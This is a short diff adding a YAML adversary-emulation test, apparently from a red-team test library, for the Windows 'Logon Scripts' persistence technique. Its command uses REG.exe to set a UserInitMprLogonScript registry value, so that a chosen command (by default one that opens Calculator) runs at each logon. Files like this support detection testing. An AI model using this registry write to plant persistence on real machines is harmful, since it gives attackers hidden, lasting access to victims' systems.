@@ -1,0 +1,22 @@
+---
+attack_technique: Logon Scripts
+display_name: Logon Scripts
+
+atomic_tests:
+- name: Add Logon Script To Registry
+  description: |
+    Adds a Logon Scirpt Using Reg.exe
+
+  supported_platforms:
+    - windows
+
+  input_arguments:
+    logon_cmd:
+      description: Command to Execute
+      type: String
+      default: cmd.exe /c calc.exe
+
+  executor:
+    name: command_prompt
+    command: |
+      REG.exe ADD HKCU\Environment /v UserInitMprLogonScript /t REG_MULTI_SZ /d "#{logon_cmd}"
